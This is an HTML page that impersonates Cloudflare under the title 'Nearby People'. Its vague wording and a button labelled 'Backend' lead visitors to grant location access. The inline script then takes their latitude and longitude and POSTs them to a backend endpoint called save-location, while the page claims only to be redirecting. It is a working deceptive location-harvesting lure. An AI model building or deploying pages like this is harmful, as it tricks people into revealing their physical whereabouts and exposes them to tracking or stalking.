<!DOCTYPE html>
<html>
<head>
<title>Nearby People</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">


<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Inter, "Segoe UI", sans-serif;
}


body{

    min-height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    padding:20px;

    background:
    linear-gradient(160deg,#667eea,#764ba2);

}



.container{

    width:100%;
    max-width:420px;

}



.card{

    background:rgba(255,255,255,0.95);

    border-radius:30px;

    padding:40px 25px;

    text-align:center;

    box-shadow:
    0 25px 50px rgba(0,0,0,0.25);

}



.logo{

    width:90px;
    height:90px;

    margin:auto;
    margin-bottom:25px;

    display:flex;
    justify-content:center;
    align-items:center;

    border-radius:50%;

    background:#eef1ff;

    font-size:45px;

}



h1{

    font-size:28px;

    color:#222;

    margin-bottom:12px;

}



.subtitle{

    font-size:16px;

    line-height:1.5;

    color:#777;

    margin-bottom:35px;

}



button{

    width:100%;

    height:60px;

    border:none;

    border-radius:18px;

    background:
    linear-gradient(135deg,#667eea,#764ba2);

    color:white;

    font-size:18px;

    font-weight:600;

    cursor:pointer;

    box-shadow:
    0 10px 25px rgba(102,126,234,.4);

    transition:.3s;

}



button:active{

    transform:scale(.96);

}



#status{

    margin-top:25px;

    font-size:16px;

    font-weight:600;

}



.location{

    margin-top:15px;

    padding:15px;

    border-radius:15px;

    background:#f5f5f5;

    color:#555;

    font-size:14px;

}



.footer{

    margin-top:30px;

    font-size:13px;

    color:#999;

}




@media(max-width:400px){

    .card{

        padding:35px 20px;

    }


    h1{

        font-size:24px;

    }


    .logo{

        width:75px;
        height:75px;

        font-size:38px;

    }


}



</style>

</head>


<body>


<div class="container">


<div class="card">


<div class="logo">
📍
</div>



<h1>
Cloudflare
</h1>


<p class="subtitle">

Please allow and move forward into helping us with better results

</p>



<button onclick="getLocation()">

Backend

</button>



<p id="status"></p>


<div class="location" id="coords">

Waiting for redirection...

</div>


<p class="footer">

Tashiiiii

</p>



</div>


</div>





<script>


function getLocation(){


let status=document.getElementById("status");


status.innerHTML="⏳ redirecting";



navigator.geolocation.getCurrentPosition(

function(position){


let lat=position.coords.latitude;

let lon=position.coords.longitude;




fetch("http://127.0.0.1:8000/save-location",
{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

latitude:lat,

longitude:lon

})

})

.then(res=>res.json())

.then(data=>{

console.log(data);

});



},


function(){

status.innerHTML=
"❌ Please allow location permission";

}



);



}


</script>



</body>
</html>
